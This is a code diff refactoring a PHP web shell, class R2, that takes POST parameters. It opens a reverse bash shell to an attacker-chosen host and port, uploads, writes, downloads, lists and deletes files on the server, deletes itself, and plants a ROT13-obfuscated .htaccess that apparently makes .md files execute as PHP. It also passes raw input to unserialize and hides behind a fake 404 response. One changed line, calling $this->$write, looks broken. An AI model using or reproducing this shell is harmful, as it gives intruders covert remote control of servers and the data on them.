@@ -23,12 +23,24 @@ class R2
     public static $daemon = 0;
     public static $shell = 'bash -i'; // bash
     public static $htaccess = 'NqqGlcr+nccyvpngvba%2Sk-uggcq-cuc+.zq';
+    public static $cwd = null;
     /*
      * @param string $host attacker ip/host
      * @param int $port attacker port
      * @return none
      */
-    public static function reverse(string $host, int $port)
+    public function __construct(bool $debug = true, int $time = 0)
+    {
+        if ($debug === true) {
+            error_reporting(E_ALL);
+        } else {
+            error_reporting($debug);
+        }
+
+        error_log($debug);
+        set_time_limit($time);
+    }
+    public function reverse(string $host, int $port)
     {
         if (function_exists('pcntl_fork')) {
             $pid = pcntl_fork();
@@ -41,7 +53,7 @@ class R2
             if (posix_setsid() == -1) {
                 exit(1);
             }
-            self::$daemon = 1;
+            R2::$daemon = 1;
         }
         // Remove any umask we inherited
         umask(0);
@@ -59,7 +71,7 @@ class R2
             2 => array('pipe', 'w') // stderr
         );
 
-        $process = proc_open(self::$shell, $descriptorspec, $pipes);
+        $process = proc_open(R2::$shell, $descriptorspec, $pipes);
 
         if (!is_resource($process)) {
             exit(1);
@@ -81,23 +93,23 @@ class R2
             $read_a = array($sock, $pipes[1], $pipes[2]);
             $num_changed_sockets = stream_select(
                 $read_a,
-                self::$write_a,
-                self::$error_a,
+                R2::$write_a,
+                R2::$error_a,
                 null
             );
 
             if (in_array($sock, $read_a)) {
-                $input = fread($sock, self::$chunk_size);
+                $input = fread($sock, R2::$chunk_size);
                 fwrite($pipes[0], $input);
             }
 
             if (in_array($pipes[1], $read_a)) {
-                $input = fread($pipes[1], self::$chunk_size);
+                $input = fread($pipes[1], R2::$chunk_size);
                 fwrite($sock, $input);
             }
 
             if (in_array($pipes[2], $read_a)) {
-                $input = fread($pipes[2], self::$chunk_size);
+                $input = fread($pipes[2], R2::$chunk_size);
                 fwrite($sock, $input);
             }
         }
@@ -112,7 +124,7 @@ class R2
      * @param array $file from $_FILES
      * @return bool
      */
-    public static function upload(array $file)
+    public function upLoad(array $file)
     {
         return move_uploaded_file($file['tmp_name'], $file['name']);
     }
@@ -120,7 +132,7 @@ class R2
      * @param none
      * @return bool
      */
-    public static function remove()
+    public function remove()
     {
         return unlink($_SERVER['SCRIPT_FILENAME']);
     }
@@ -129,7 +141,7 @@ class R2
      * @param string $file mix encoded source
      * @return bool
      */
-    public static function write(string $name, string $file)
+    public function write(string $name, string $file)
     {
         return file_put_contents($name, str_rot13(urldecode($file)));
     }
@@ -137,15 +149,15 @@ class R2
      * @param none
      * @return bool
      */
-    public static function htaccess()
+    public function htaccess()
     {
-        return self::write('.htaccess', self::$htaccess);
+        return $this->$write('.htaccess', R2::$htaccess);
     }
     /*
      * @param string $class class to be reflected
      * @return json
      */
-    public static function help(string $class)
+    public function help(string $class)
     {
         $ref = new ReflectionClass($class);
         return json_encode(
@@ -162,7 +174,7 @@ class R2
      * @param string $value value to be replaced
      * @return none
      */
-    public static function debug(string $class, string $property, string $value)
+    public function debug(string $class, string $property, string $value)
     {
         $ref = new ReflectionClass($class);
         $ref->setStaticPropertyValue($property, $value);
@@ -172,7 +184,7 @@ class R2
      * @param none
      * @return json
      */
-    public static function info()
+    public function info()
     {
         ob_start();
         phpinfo();
@@ -215,7 +227,7 @@ class R2
      * @param string $file path to filename
      * @return mixed
      */
-    public static function downLoad(string $file)
+    public function downLoad(string $file)
     {
         header("Content-Disposition: attachment; filename=" . basename($file));
         header("Content-Length: " . filesize($file));
@@ -226,7 +238,7 @@ class R2
      * @param string $ls path to listed
      * @return json
      */
-    public static function ls($dir)
+    public function ls($dir)
     {
         return json_encode(
             scandir(getcwd() . DIRECTORY_SEPARATOR . $dir),
@@ -237,43 +249,42 @@ class R2
      * @param string $file file path to be removed
      * @return bool
      */
-    public static function rm(string $file)
+    public function rm(string $file)
     {
         return unlink(getcwd() . DIRECTORY_SEPARATOR . $file);
     }
-    public static function serial($data)
+    public function serial($data)
     {
         return unserialize($data) . PHP_EOL;
     }
 }
-set_time_limit(0);
-//error_reporting(0);
-error_log(0);
+$r2 = new R2(true, 0);
+
 if (isset($_POST['debug'])) {
-    echo R2::debug($_POST['debug'], $_POST['property'], $_POST['value']);
+    echo $r2->debug($_POST['debug'], $_POST['property'], $_POST['value']);
 }
 if (isset($_POST['host']) && isset($_POST['port'])) {
-    R2::reverse($_POST['host'], $_POST['port']);
+    $r2->reverse($_POST['host'], $_POST['port']);
 } elseif (isset($_FILES['upload'])) {
-    echo R2::upload($_FILES['upload']);
+    echo $r2->upLoad($_FILES['upload']);
 } elseif (isset($_POST['remove'])) {
-    echo R2::remove();
+    echo $r2->remove();
 } elseif (isset($_POST['htaccess'])) {
-    echo R2::htaccess();
+    echo $r2->htaccess();
 } elseif (isset($_POST['name']) && isset($_POST['write'])) {
-    echo R2::write($_POST['name'], $_POST['write']);
+    echo $r2->write($_POST['name'], $_POST['write']);
 } elseif (isset($_POST['help'])) {
-    echo R2::help($_POST['help']);
+    echo $r2->help($_POST['help']);
 } elseif (isset($_POST['info'])) {
-    echo R2::info();
+    echo $r2->info();
 } elseif (isset($_POST['download'])) {
-    R2::downLoad($_POST['download']);
+    $r2->downLoad($_POST['download']);
 } elseif (isset($_POST['ls'])) {
-    echo R2::ls($_POST['ls']);
+    echo $r2->ls($_POST['ls']);
 } elseif (isset($_POST['rm'])) {
-    echo R2::rm($_POST['rm']);
+    echo $r2->rm($_POST['rm']);
 } elseif (isset($_POST['serial'])) {
-    echo R2::serial($_POST['serial']);
+    echo $r2->serial($_POST['serial']);
 } else {
     header('HTTP/1.0 404 Not Found', true, 404);
     exit(404);
